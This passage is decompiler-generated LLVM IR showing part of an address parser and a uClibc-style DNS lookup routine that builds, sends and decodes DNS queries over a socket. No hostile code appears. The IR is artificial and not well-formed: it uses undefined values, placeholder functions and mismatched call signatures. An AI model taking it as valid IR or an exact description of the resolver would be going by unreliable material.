  %v1_17ad8 = add i32 %v4_17ad4, -48
  %v8_17ae0 = icmp sgt i32 %v1_17ad8, 255
  br i1 %v8_17ae0, label %dec_label_pc_17b74, label %dec_label_pc_17ae4

dec_label_pc_17ae4:                               ; preds = %dec_label_pc_17ad0
  %v1_17ae4 = add i32 %v0_17b24, 1
  store i32 %v1_17ae4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17ae8

dec_label_pc_17ae8:                               ; preds = %dec_label_pc_17ac8, %dec_label_pc_17ae4
  %v0_17b34 = phi i32 [ 0, %dec_label_pc_17ac8 ], [ %v1_17ad8, %dec_label_pc_17ae4 ]
  %v0_17b24 = phi i32 [ %v0_17ab8, %dec_label_pc_17ac8 ], [ %v1_17ae4, %dec_label_pc_17ae4 ]
  %v1_17ae8 = inttoptr i32 %v0_17b24 to i8*
  %v2_17ae8 = load i8, i8* %v1_17ae8, align 1
  %v3_17ae8 = zext i8 %v2_17ae8 to i32
  %v2_17aec = mul nuw nsw i32 %v3_17ae8, 2
  %v2_17af0 = add i32 %v2_17aec, %v2_17ab4.pre
  %v3_17af4 = inttoptr i32 %v2_17af0 to i8*
  %v4_17af4 = load i8, i8* %v3_17af4, align 1
  %v6_17af4 = zext i8 %v4_17af4 to i32
  %v1_17b00 = and i32 %v6_17af4, 8
  %v2_17b00 = icmp eq i32 %v1_17b00, 0
  br i1 %v2_17b00, label %dec_label_pc_17b08, label %dec_label_pc_17ad0

dec_label_pc_17b08:                               ; preds = %dec_label_pc_17ae8
  %v8_17b0c = icmp sgt i32 %v0_17b38, 3
  br i1 %v8_17b0c, label %dec_label_pc_17b20, label %dec_label_pc_17b10

dec_label_pc_17b10:                               ; preds = %dec_label_pc_17b08
  %v7_17b10 = icmp eq i8 %v2_17ae8, 46
  br i1 %v7_17b10, label %dec_label_pc_17b18, label %dec_label_pc_17b74

dec_label_pc_17b18:                               ; preds = %dec_label_pc_17b10
  %v1_17b18 = add i32 %v0_17b24, 1
  store i32 %v1_17b18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17b34

dec_label_pc_17b20:                               ; preds = %dec_label_pc_17b08
  %v2_17b20 = icmp eq i8 %v2_17ae8, 0
  %v1_17b24 = add i32 %v0_17b24, 1
  store i32 %v1_17b24, i32* %r0.global-to-local, align 4
  br i1 %v2_17b20, label %dec_label_pc_17b34, label %dec_label_pc_17b2c

dec_label_pc_17b2c:                               ; preds = %dec_label_pc_17b20
  %v1_17b2c = and i32 %v6_17af4, 32
  %v2_17b2c = icmp eq i32 %v1_17b2c, 0
  br i1 %v2_17b2c, label %dec_label_pc_17b74, label %dec_label_pc_17b34

dec_label_pc_17b34:                               ; preds = %dec_label_pc_17b2c, %dec_label_pc_17b20, %dec_label_pc_17b18
  %v0_17ab825 = phi i32 [ %v1_17b24, %dec_label_pc_17b2c ], [ %v1_17b24, %dec_label_pc_17b20 ], [ %v1_17b18, %dec_label_pc_17b18 ]
  %v4_17b34 = mul i32 %v1_17b34, 256
  %v5_17b34 = or i32 %v0_17b34, %v4_17b34
  %v1_17b38 = add nuw nsw i32 %v0_17b38, 1
  %v7_17b40 = icmp slt i32 %v1_17b38, 5
  br i1 %v7_17b40, label %dec_label_pc_17ab0, label %dec_label_pc_17b44

dec_label_pc_17ab0.lr.ph:                         ; preds = %entry
  %v2_17ab4.pre = load i32, i32* @global_var_2c58c, align 4
  br label %dec_label_pc_17ab0

dec_label_pc_17b44:                               ; preds = %dec_label_pc_17b34
  %v2_17b44 = icmp eq i32 %arg2, 0
  br i1 %v2_17b44, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_17b44
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_17b44
  %v3_17b60 = call i32 @llvm.bswap.i32(i32 %v5_17b34)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17b6c = inttoptr i32 %arg2 to i32*
  store i32 %v3_17b60, i32* %v3_17b6c, align 4
  %v2_17b70.pre = load i32, i32* %stack_var_-20, align 4
  %v17_17b70.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_17b70 = phi i32 [ 1, %bb ], [ %v17_17b70.pre, %bb41 ]
  %v2_17b70 = phi i32 [ %v3_17a98, %bb ], [ %v2_17b70.pre, %bb41 ]
  store i32 %v2_17b70, i32* @r4, align 4
  ret i32 %v17_17b70

dec_label_pc_17b74:                               ; preds = %dec_label_pc_17b10, %dec_label_pc_17b2c, %dec_label_pc_17ab0, %dec_label_pc_17ad0, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_17a98, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_17ab4.pre, { 2, 1, 0 }
  uselistorder i32 %v1_17b38, { 1, 0 }
  uselistorder i32 %v0_17b24, { 0, 1, 3, 2 }
  uselistorder i32 %v3_17a98, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_17b74, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_17ae8, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_17b80 = load i32, i32* @r4, align 4
  %v6_17b80 = load i32, i32* @r5, align 4
  %v9_17b80 = load i32, i32* @r6, align 4
  %v12_17b80 = load i32, i32* @r7, align 4
  %v15_17b80 = load i32, i32* @r8, align 4
  %v18_17b80 = load i32, i32* @sb, align 4
  %v21_17b80 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_17ba0 = call i32 @malloc(i32 512)
  store i32 %v1_17ba0, i32* @r7, align 4
  %v1_17bac = call i32 @malloc(i32 1025)
  %v2_17bb0 = icmp eq i32 %v1_17bac, 0
  br i1 %v2_17bb0, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_17bb4 = load i32, i32* @r7, align 4
  %v3_17bb4 = icmp eq i32 %v1_17bb4, 0
  store i32 %v1_17bac, i32* %stack_var_-236, align 4
  br i1 %v3_17bb4, label %bb195, label %dec_label_pc_17bc8

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_182a8

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_182a8

dec_label_pc_17bc8:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_17bcc = icmp eq i32 %arg3, 0
  br i1 %v2_17bcc, label %dec_label_pc_182a8, label %dec_label_pc_17bd4

dec_label_pc_17bd4:                               ; preds = %dec_label_pc_17bc8
  %v2_17bd8 = load i8, i8* %arg1, align 1
  %v2_17bdc = icmp eq i8 %v2_17bd8, 0
  br i1 %v2_17bdc, label %dec_label_pc_182a8, label %dec_label_pc_17be4

dec_label_pc_17be4:                               ; preds = %dec_label_pc_17bd4
  %v3_17be8 = call i32 @strlen(i8* nonnull %arg1)
  %v2_17bf0 = add i32 %v3_17be8, %tmp
  %v1_17bf4 = add i32 %v2_17bf0, -1
  %v2_17bf4 = inttoptr i32 %v1_17bf4 to i8*
  %v3_17bf4 = load i8, i8* %v2_17bf4, align 1
  %v2_17bf8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_17bf8, i32* @r4, align 4
  %v7_17bfc = icmp eq i8 %v3_17bf4, 46
  %. = zext i1 %v7_17bfc to i32
  store i32 %v2_17bf8, i32* @r0, align 4
  %v1_17c20 = call i32 @__pthread_return_void()
  %v1_17c30 = call i32 @__pthread_return_0()
  %v2_17c3c = load i32, i32* @global_var_32b7c.1290, align 4
  %v2_17c40 = srem i32 %v2_17c3c, %arg3
  %v3_17c48 = load i8, i8* @global_var_2c8cd.1293, align 1
  %v4_17c48 = zext i8 %v3_17c48 to i32
  %v2_17c4c = load i8, i8* bitcast (i8** @global_var_2c8cc.1292 to i8*), align 4
  %v3_17c4c = zext i8 %v2_17c4c to i32
  %v4_17c54 = mul nuw nsw i32 %v4_17c48, 256
  %v5_17c54 = or i32 %v3_17c4c, %v4_17c54
  store i32 %v5_17c54, i32* @sb, align 4
  store i32 %v2_17c40, i32* @sl, align 4
  store i32 %v2_17bf8, i32* @r0, align 4
  %v1_17c68 = call i32 @__pthread_return_void()
  %v0_17c74 = load i32, i32* @r5, align 4
  %v2_17c94 = ptrtoint i8* %stack_var_-188 to i32
  %v6_17cd8 = bitcast i8* %stack_var_-188 to i32*
  %v2_17db8 = ptrtoint i32* %stack_var_-92 to i32
  %v3_17e50 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_17eb4 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_18200 = icmp eq i1 %v7_17bfc, false
  %v7_17f08 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_17fec = ptrtoint i32* %stack_var_-140 to i32
  %v9_180e4 = icmp eq i32 %tmp147, %arg2
  %v7_18078 = icmp eq i32 %arg2, 1
  %v2_18020 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_17c74, 3
  br i1 %tmp292, label %dec_label_pc_17c7c.lr.ph.preheader.lr.ph, label %dec_label_pc_182b4

dec_label_pc_17c7c.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_17be4
  %v2_17f8c = icmp eq i32 %tmp156, 0
  %v8_1807c = icmp eq i32 %arg2, 28
  br label %dec_label_pc_17c7c.lr.ph.preheader

dec_label_pc_17c7c:                               ; preds = %dec_label_pc_17c7c.lr.ph, %dec_label_pc_18298.backedge
  %v1_17c84 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_17c7c.lr.ph ], [ %v0_17e2c, %dec_label_pc_18298.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_17c7c.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_18298.backedge ]
  %v7_17c80 = icmp eq i32 %v1_17c84, -1
  br i1 %v7_17c80, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_17c7c
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_17c7c, %bb199
  %v1_17c88 = xor i1 %v7_17c80, true
  call void @__pseudo_cond_branch(i1 %v1_17c88, i32 ptrtoint (i32* @global_var_11ce8.1295 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_17c94, i32* @r4, align 4
  %v0_17c98 = load i32, i32* @r7, align 4
  %v2_17c9c = inttoptr i32 %v0_17c98 to i8*
  %v3_17c9c = call i32 @__GI_memset(i8* %v2_17c9c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_17cac = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_17cb0 = load i32, i32* @sb, align 4
  %v1_17cb0 = add i32 %v0_17cb0, 1
  %v3_17cb8 = urem i32 %v1_17cb0, 65536
  store i32 %v3_17cb8, i32* @sb, align 4
  %v0_17cc4 = load i32, i32* @r7, align 4
  %v5_17cd0 = trunc i32 %v1_17cb0 to i8
  store i8 %v5_17cd0, i8* %stack_var_-188, align 1
  %v7_17cd8 = call i32 @__encode_header(i32* %v6_17cd8, i32 %v0_17cc4, i32 512, i32 1, i32 %v1_17cb0)
  store i32 %v7_17cd8, i32* @r5, align 4
  %v1_17cdc = icmp slt i32 %v7_17cd8, 0
  br i1 %v1_17cdc, label %dec_label_pc_182b4, label %dec_label_pc_17ce4

dec_label_pc_17ce4:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_17cec = load i32, i32* %stack_var_-236, align 4
  %v4_17cf0 = call i32 @strncpy(i32 %v2_17cec, i32 %tmp, i32 1025)
  store i32 %v2_17bf8, i32* @r0, align 4
  %v1_17d08 = call i32 @__pthread_return_void()
  %v1_17d18 = call i32 @__pthread_return_0()
  %v1_17d28 = load i32, i32* @sl, align 4
  %v4_17d28 = mul i32 %v1_17d28, 4
  %v5_17d28 = add i32 %v4_17d28, %arg4
  %v6_17d28 = inttoptr i32 %v5_17d28 to i32*
  %v7_17d28 = load i32, i32* %v6_17d28, align 4
  store i32 %v7_17d28, i32* @r6, align 4
  br i1 %v1_17d24, label %dec_label_pc_17d6c, label %dec_label_pc_17d30

dec_label_pc_17d30:                               ; preds = %dec_label_pc_17ce4
  %v2_17d38 = load i32, i32* @global_var_32c4c.1298, align 4
  %v6_17d40 = icmp slt i32 %v6_1825c, %v2_17d38
  br i1 %v6_17d40, label %dec_label_pc_17d44, label %dec_label_pc_17d6c

dec_label_pc_17d44:                               ; preds = %dec_label_pc_17d30
  store i32 ptrtoint (i32* @global_var_24264.1300 to i32), i32* @r1, align 4
  %v2_17d4c = load i32, i32* %stack_var_-236, align 4
  %v4_17d50 = inttoptr i32 %v2_17d4c to i8*
  %v5_17d50 = call i32 @__GI_strncat(i8* %v4_17d50, i32 ptrtoint (i32* @global_var_24264.1300 to i32), i32 1025, i32 %v2_17d38)
  %v7_17d60 = load i32, i32* %v6_17d60, align 4
  store i32 %v7_17d60, i32* @r1, align 4
  %v4_17d68 = inttoptr i32 %v2_17d4c to i8*
  %v5_17d68 = call i32 @__GI_strncat(i8* %v4_17d68, i32 %v7_17d60, i32 1025, i32 ptrtoint (i32* @global_var_32c2c.1302 to i32))
  br label %dec_label_pc_17d6c

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d30, %dec_label_pc_17ce4, %dec_label_pc_17d44
  store i32 %v2_17bf8, i32* @r0, align 4
  store i32 97664, i32* @lr, align 4
  %v1_17d7c = call i32 @__pthread_return_void()
  %v2_17d88 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_17d88, i32* %stack_var_-56, align 4
  %v0_17d98 = load i32, i32* @r7, align 4
  %v1_17d98 = load i32, i32* @r5, align 4
  %v2_17d98 = add i32 %v1_17d98, %v0_17d98
  %v1_17d9c = sub i32 512, %v1_17d98
  %v8_17da4 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_17d98, i32 %v1_17d9c, i32 %arg2, i32 %v2_17d88, i32 %arg2, i32 1)
  store i32 %v8_17da4, i32* @fp, align 4
  %v1_17da8 = icmp slt i32 %v8_17da4, 0
  br i1 %v1_17da8, label %dec_label_pc_182b4, label %dec_label_pc_17db0

dec_label_pc_17db0:                               ; preds = %dec_label_pc_17d6c
  store i32 0, i32* @r4, align 4
  %v0_17dc0 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_17dcc = inttoptr i32 %v0_17dc0 to i8*
  %v4_17dcc = call i32 @inet_pton(i32 10, i8* %v3_17dcc, i32 %v2_17db8)
  %v1_17dd0 = load i32, i32* @r4, align 4
  %v7_17dd4 = icmp sgt i32 %v4_17dcc, %v1_17dd0
  br i1 %v7_17dd4, label %bb201, label %dec_label_pc_17db0..thread11_crit_edge

dec_label_pc_17db0..thread11_crit_edge:           ; preds = %dec_label_pc_17db0
  %v3_17de0.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_17db0
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_17db0..thread11_crit_edge, %bb201
  %v3_17de0 = phi i8 [ %v3_17de0.pre, %dec_label_pc_17db0..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_17de0 = sext i8 %v3_17de0 to i32
  %v8_17ddc.op = urem i32 %v1_17dd0, 256
  %v8_17ddc.op.op = mul nuw nsw i32 %v8_17ddc.op, 256
  %v4_17de8 = select i1 %v7_17dd4, i32 %v8_17ddc.op.op, i32 0
  %v5_17de8 = or i32 %v4_17de0, %v4_17de8
  %v7_17dec = icmp eq i32 %v5_17de8, 10
  br i1 %v7_17dec, label %dec_label_pc_17e18, label %dec_label_pc_17e00

dec_label_pc_17e00:                               ; preds = %.thread11
  %v0_17e04 = load i32, i32* @r6, align 4
  store i32 %v0_17e04, i32* @r0, align 4
  %v1_17e10 = call i32 @inet_addr(i32 %v0_17e04)
  br label %dec_label_pc_17e18

dec_label_pc_17e18:                               ; preds = %.thread11, %dec_label_pc_17e00
  %v0_17e2c = call i32 @socket()
  %v1_17e30 = icmp slt i32 %v0_17e2c, 0
  br i1 %v1_17e30, label %.thread, label %dec_label_pc_17e48

.thread:                                          ; preds = %dec_label_pc_17e18
  br label %dec_label_pc_18298.backedge

dec_label_pc_18298.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_17c7c, label %dec_label_pc_182b4

dec_label_pc_17e48:                               ; preds = %dec_label_pc_17e18
  %v4_17e50 = call i32 @__libc_connect(i32 %v0_17e2c, %sockaddr* nonnull %v3_17e50, i32 28)
  %v1_17e54 = icmp slt i32 %v4_17e50, 0
  br i1 %v1_17e54, label %dec_label_pc_17e5c, label %dec_label_pc_17e7c

dec_label_pc_17e5c:                               ; preds = %dec_label_pc_17e48
  %v0_17e5c = call i32 @__errno_location()
  %v1_17e60 = inttoptr i32 %v0_17e5c to i32*
  %v2_17e60 = load i32, i32* %v1_17e60, align 4
  %v7_17e64 = icmp eq i32 %v2_17e60, 101
  br i1 %v7_17e64, label %dec_label_pc_181c8, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_17e5c
  br label %dec_label_pc_18298.backedge

dec_label_pc_17e7c:                               ; preds = %dec_label_pc_17e48
  %v0_17e7c = load i32, i32* @r5, align 4
  %v1_17e7c = load i32, i32* @fp, align 4
  %v2_17e7c = add i32 %v1_17e7c, %v0_17e7c
  %v0_17e80 = load i32, i32* @r7, align 4
  %v4_17e8c = inttoptr i32 %v0_17e80 to i32*
  %v5_17e8c = call i32 @__libc_send(i32 %v0_17e2c, i32* %v4_17e8c, i32 %v2_17e7c, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_17e2c, i32* %stack_var_-44, align 4
  %v11_17eb4 = call i32 @__libc_poll(%pollfd* %v10_17eb4, i32 1, i32 10000, i32 1, i32 %v0_17e2c, i32 1, i32 0)
  %v1_17eb8 = load i32, i32* @r4, align 4
  %v7_17ebc = icmp sgt i32 %v11_17eb4, %v1_17eb8
  br i1 %v7_17ebc, label %dec_label_pc_17ec0, label %dec_label_pc_181c8

dec_label_pc_17ec0:                               ; preds = %dec_label_pc_17e7c
  %v0_17ec8 = load i32, i32* @r7, align 4
  %v5_17ed0 = inttoptr i32 %v0_17ec8 to i32*
  %v6_17ed0 = call i32 @__libc_recv(i32 %v0_17e2c, i32* %v5_17ed0, i32 512, i32 %v1_17eb8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_17ed0, i32* @fp, align 4
  %v7_17edc = icmp slt i32 %v6_17ed0, 12
  br i1 %v7_17edc, label %dec_label_pc_181fc, label %dec_label_pc_17ee0

dec_label_pc_17ee0:                               ; preds = %dec_label_pc_17ec0
  %v0_17ee0 = load i32, i32* @r7, align 4
  %v2_17ee8 = inttoptr i32 %v0_17ee0 to i8*
  %v3_17ee8 = call i32 @__decode_header(i8* %v2_17ee8, i32 %v2_17c94)
  %v3_17eec = load i8, i8* %stack_var_-188, align 1
  %v4_17eec = sext i8 %v3_17eec to i32
  store i32 %v4_17eec, i32* @r6, align 4
  %v1_17ef0 = load i32, i32* @sb, align 4
  %v9_17ef0 = icmp eq i32 %v4_17eec, %v1_17ef0
  br i1 %v9_17ef0, label %dec_label_pc_17ef8, label %dec_label_pc_181fc

dec_label_pc_17ef8:                               ; preds = %dec_label_pc_17ee0
  %v1_17efc = load i32, i32* @r4, align 4
  %v9_17efc = icmp eq i32 %tmp157, %v1_17efc
  br i1 %v9_17efc, label %dec_label_pc_181fc, label %dec_label_pc_17f04

dec_label_pc_17f04:                               ; preds = %dec_label_pc_17ef8
  br i1 %v7_17f08, label %dec_label_pc_17f10, label %dec_label_pc_17f8c

dec_label_pc_17f10:                               ; preds = %dec_label_pc_17f04
  %v9_17f14 = icmp eq i32 %., %v1_17efc
  br i1 %v9_17f14, label %dec_label_pc_17f1c, label %dec_label_pc_17f80

dec_label_pc_17f1c:                               ; preds = %dec_label_pc_17f10
  store i32 %v2_17bf8, i32* @r5, align 4
  store i32 %v2_17bf8, i32* @r0, align 4
  %v1_17f34 = call i32 @__pthread_return_void()
  %v1_17f44 = call i32 @__pthread_return_0()
  store i32 %v2_17bf8, i32* @r0, align 4
  %v2_17f50 = load i32, i32* @global_var_32c4c.1298, align 4
  %v1_17f60 = call i32 @__pthread_return_void()
  %v1_17f68 = add i32 %v2_17f50, -1
  store i32 %v1_17f68, i32* @r4, align 4
  %v5_17f70 = icmp slt i32 %v6_1825c, %v1_17f68
  br i1 %v5_17f70, label %.thread19, label %dec_label_pc_17f80

.thread19:                                        ; preds = %dec_label_pc_17f1c
  %v7_17f70 = add i32 %v6_1825c, 1
  %v6_17f74 = load i32, i32* @r6, align 4
  store i32 %v6_17f74, i32* @sb, align 4
  br label %dec_label_pc_18298.outer.backedge

dec_label_pc_17f80:                               ; preds = %dec_label_pc_17f1c, %dec_label_pc_17f10
  %v0_17f80 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_17fb0

dec_label_pc_17f8c:                               ; preds = %dec_label_pc_17f04
  br i1 %v2_17f8c, label %dec_label_pc_17f94, label %dec_label_pc_181fc

dec_label_pc_17f94:                               ; preds = %dec_label_pc_17f8c
  br i1 %tmp198, label %dec_label_pc_17fa8, label %dec_label_pc_17fc0.preheader

dec_label_pc_17fc0.preheader:                     ; preds = %dec_label_pc_17f94
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_17fc0

dec_label_pc_17fa8:                               ; preds = %dec_label_pc_17f94
  %v0_17fa8 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_17fb0

dec_label_pc_17fb0:                               ; preds = %dec_label_pc_17f80, %dec_label_pc_17fa8
  %storemerge4 = phi i32 [ %v0_17fa8, %dec_label_pc_17fa8 ], [ %v0_17f80, %dec_label_pc_17f80 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_17fa8 ], [ 1, %dec_label_pc_17f80 ]
  %v2_17fb0 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_17fb0, align 4
  br label %dec_label_pc_182c4

dec_label_pc_17fb8:                               ; preds = %dec_label_pc_17fc0
  %v2_17fb8 = call i32 @__length_question(i32 %v0_17fcc, i32 %v0_17fc8)
  %v0_17fbc = load i32, i32* @r5, align 4
  %v2_17fbc = add i32 %v0_17fbc, %v2_17fb8
  store i32 %v2_17fbc, i32* @r5, align 4
  %v0_17fc4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17fc0

dec_label_pc_17fc0:                               ; preds = %dec_label_pc_17fc0.preheader, %dec_label_pc_17fb8
  %v0_17fc8 = phi i32 [ 12, %dec_label_pc_17fc0.preheader ], [ %v2_17fbc, %dec_label_pc_17fb8 ]
  %v0_17fd0 = phi i32 [ 0, %dec_label_pc_17fc0.preheader ], [ %v0_17fc4.pre, %dec_label_pc_17fb8 ]
  store i32 %v0_17fc8, i32* @r1, align 4
  %v0_17fcc = load i32, i32* @r7, align 4
  store i32 %v0_17fcc, i32* @r0, align 4
  %v1_17fd0 = add i32 %v0_17fd0, 1
  store i32 %v1_17fd0, i32* @r4, align 4
  %v5_17fd4 = icmp slt i32 %v0_17fd0, 1
  br i1 %v5_17fd4, label %dec_label_pc_17fb8, label %dec_label_pc_17fd8

dec_label_pc_17fd8:                               ; preds = %dec_label_pc_17fc0
  br label %dec_label_pc_18134

dec_label_pc_17fec:                               ; preds = %bb205
  store i32 %v2_17fec, i32* @r4, align 4
  %v0_17ff0 = load i32, i32* @r7, align 4
  %v0_17ff8 = load i32, i32* @fp, align 4
  %v5_18000 = call i32 @__decode_answer(i32 %v0_17ff0, i32 %v0_17ff4, i32 %v0_17ff8, i32* nonnull %stack_var_-140)
  %v1_18004 = icmp slt i32 %v5_18000, 0
  br i1 %v1_18004, label %dec_label_pc_18010, label %dec_label_pc_1802c

dec_label_pc_18010:                               ; preds = %dec_label_pc_17fec
  %v2_18014 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_18014, label %dec_label_pc_181fc, label %dec_label_pc_1801c

dec_label_pc_1801c:                               ; preds = %dec_label_pc_18010
  br i1 %v2_18020, label %dec_label_pc_181fc, label %dec_label_pc_18148

dec_label_pc_1802c:                               ; preds = %dec_label_pc_17fec
  %v2_18030 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_18030, label %dec_label_pc_180d4, label %dec_label_pc_18038

dec_label_pc_18038:                               ; preds = %dec_label_pc_1802c
  %v0_18038 = load i32, i32* @r8, align 4
  %v6_1803c = add i32 %v0_18038, 36
  %v7_1803c = inttoptr i32 %v6_1803c to i32*
  %v8_1803c = load i32, i32* %v7_1803c, align 4
  store i32 %v8_1803c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_17fec, i32* @r1, align 4
  store i32 %v0_18038, i32* @r0, align 4
  %v0_18058 = call i32 @memcpy()
  %v0_1805c = load i32, i32* @r8, align 4
  %v1_1805c = add i32 %v0_1805c, 4
  %v2_1805c = inttoptr i32 %v1_1805c to i32*
  %v3_1805c = load i32, i32* %v2_1805c, align 4
  %v7_18060 = icmp eq i32 %v3_1805c, 24
  br i1 %v7_18060, label %dec_label_pc_18084, label %dec_label_pc_18068

dec_label_pc_18068:                               ; preds = %dec_label_pc_18038
  %v1_18068 = add i32 %v0_1805c, 28
  %v2_18068 = inttoptr i32 %v1_18068 to i32*
  %v3_18068 = load i32, i32* %v2_18068, align 4
  %v2_1806c = icmp eq i32 %v3_18068, 0
  br i1 %v2_1806c, label %dec_label_pc_18148, label %dec_label_pc_18074

dec_label_pc_18074:                               ; preds = %dec_label_pc_18068
  br i1 %v7_18078, label %dec_label_pc_18084, label %bb203

bb203:                                            ; preds = %dec_label_pc_18074
  br i1 %v8_1807c, label %dec_label_pc_18084, label %dec_label_pc_18148

dec_label_pc_18084:                               ; preds = %dec_label_pc_18074, %bb203, %dec_label_pc_18038
  %v9_18088 = icmp eq i32 %v3_1805c, %arg2
  br i1 %v9_18088, label %dec_label_pc_1809c, label %dec_label_pc_18090

dec_label_pc_18090:                               ; preds = %dec_label_pc_18084
  %v1_18090 = inttoptr i32 %v0_1805c to i32*
  %v2_18090 = load i32, i32* %v1_18090, align 4
  store i32 %v2_18090, i32* @r0, align 4
  %v0_18094 = call i32 @free()
  br label %dec_label_pc_18120

dec_label_pc_1809c:                               ; preds = %dec_label_pc_18084
  %v1_180a4 = add i32 %v0_1805c, 16
  %v2_180a4 = inttoptr i32 %v1_180a4 to i32*
  %v3_180a4 = load i32, i32* %v2_180a4, align 4
  %v2_180a8 = sub i32 %tmp155, %stack_var_-192.0
  %v1_180ac = add i32 %v2_180a8, -1
  %v1_180b0 = add i32 %v3_180a4, 4
  %v2_180b4 = mul i32 %v1_180b0, %v1_180ac
  %v1_180b8 = add i32 %v0_1805c, 32
  %v2_180b8 = inttoptr i32 %v1_180b8 to i32*
  %v3_180b8 = load i32, i32* %v2_180b8, align 4
  %v2_180c0 = add i32 %v0_1805c, 36
  %v3_180c0 = inttoptr i32 %v2_180c0 to i32*
  store i32 %v1_180ac, i32* %v3_180c0, align 4
  %tmp294 = icmp ugt i32 %v2_180b4, %v3_180b8
  br i1 %tmp294, label %dec_label_pc_18148, label %dec_label_pc_1809c.dec_label_pc_1811c_crit_edge

dec_label_pc_1809c.dec_label_pc_1811c_crit_edge:  ; preds = %dec_label_pc_1809c
  %v1_1811c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1811c

dec_label_pc_180d4:                               ; preds = %dec_label_pc_1802c
  %v3_180d4 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_180d4, i32* @r0, align 4
  %v0_180d8 = call i32 @free()
  br i1 %v9_180e4, label %dec_label_pc_180ec, label %dec_label_pc_18120

dec_label_pc_180ec:                               ; preds = %dec_label_pc_180d4
  %v0_180ec = load i32, i32* @r8, align 4
  %v1_180ec = add i32 %v0_180ec, 16
  %v2_180ec = inttoptr i32 %v1_180ec to i32*
  %v3_180ec = load i32, i32* %v2_180ec, align 4
  %v9_180f4 = icmp eq i32 %v3_180ec, %tmp146
  br i1 %v9_180f4, label %dec_label_pc_180fc, label %dec_label_pc_181f4

dec_label_pc_180fc:                               ; preds = %dec_label_pc_180ec
  %v1_180fc = add i32 %v0_180ec, 36
  %v2_180fc = inttoptr i32 %v1_180fc to i32*
  %v3_180fc = load i32, i32* %v2_180fc, align 4
  %v1_18100 = add i32 %v0_180ec, 28
  %v2_18100 = inttoptr i32 %v1_18100 to i32*
  %v3_18100 = load i32, i32* %v2_18100, align 4
